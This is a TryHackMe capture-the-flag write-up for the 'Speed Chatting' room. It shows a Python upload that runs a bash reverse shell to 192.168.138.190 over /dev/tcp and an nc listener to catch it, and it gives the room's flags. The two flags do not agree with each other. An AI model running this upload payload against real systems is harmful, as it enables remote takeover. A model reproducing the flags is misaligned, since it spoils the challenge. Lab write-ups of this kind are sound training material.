# <div align="center">[Speed Chatting - TryHackMe Write-up](https://tryhackme.com/room/lafb2026e4)</div>
<div align="center">Can you hack as fast as you can chat?</div>
<br>
<div align="center">
  <img width="200" height="200" alt="Speed-Chatting" src="https://github.com/user-attachments/assets/6046f144-cdce-4ae6-bd3e-fb725460cc77" />
</div>

## Task 1. Speed Chat
### What is the flag?
```
THM{v4l3nt1n3_jwt_c00k13_t4mp3r_4dm1n_sh0p}
```

## Accessing the Website

I started the room and noticed that most of the basic enumeration had already been taken care of. This allowed me to move quickly toward interacting with the application itself instead of spending time on discovery.

<div align="center">
  <img width="1016" height="800" alt="image" src="https://github.com/user-attachments/assets/31947002-a313-4431-ba73-4f61c18f6b34" />
</div>

The target application was exposed on port 5000, so I accessed it directly through the browser.

## Navigating the Web Application

Once the page loaded, I explored the available functionality. One of the first things that stood out was a profile picture upload feature, which looked like a potential entry point for interaction.

<div align="center">
  <img width="1348" height="765" alt="image" src="https://github.com/user-attachments/assets/2fb27bdb-3b30-432f-9a4a-2ecc16c99e80" />
</div>

While interacting with the application, I observed that messages were being handled through an API. This indicated that there was backend communication happening that might be useful later.

<div align="center">
  <img width="1295" height="755" alt="image" src="https://github.com/user-attachments/assets/ddddbdef-9b5c-4bba-b376-9d225b43bff0" />
</div>

I then inspected the HTTP response headers and identified the server details:
```
Server: Werkzeug/3.1.5 Python/3.10.12
```

<div align="center">
  <img width="1352" height="881" alt="image" src="https://github.com/user-attachments/assets/c5d64094-3f4a-4c96-8f16-47fce9754169" />
</div>

This confirmed that the application was running on a Python-based backend using Werkzeug.

<div align="center">
  <img width="1427" height="412" alt="image" src="https://github.com/user-attachments/assets/42e48eff-508c-403d-a827-112c598ef6ad" />
</div>

## Exploitation

To test for possible code execution through the upload functionality, I crafted a simple Python reverse shell.

```
cat << 'EOF' > test.py
import os
os.system("bash -c 'bash -i >& /dev/tcp/192.168.138.190/1234 0>&1'")
EOF
```

Before uploading the file, I set up a listener on my machine to catch the incoming connection.

```
nc -lnvp 1234
```

After uploading the payload, I received a reverse shell connection successfully.

<div align="center">
  <img width="812" height="160" alt="image" src="https://github.com/user-attachments/assets/9b3112dc-48ea-4fb5-8163-05e1759917c0" />
</div>

## Flag

With shell access established, I checked my privileges and confirmed that I was running as root. From there, I navigated through the system to locate the flag.

<div align="center">
  <img width="755" height="195" alt="image" src="https://github.com/user-attachments/assets/3bfefb15-29ee-49e1-b919-3a3c8f9281a0" />
</div>

```
THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}
```

<div align="center">
  <img width="918" height="643" alt="image" src="https://github.com/user-attachments/assets/2ea1195b-8b33-41df-b172-9b04c2164702" />
</div>

This room was a fast-paced challenge that focused on quick interaction and exploitation. The flow from identifying functionality to gaining shell access was straightforward but required attention to detail.
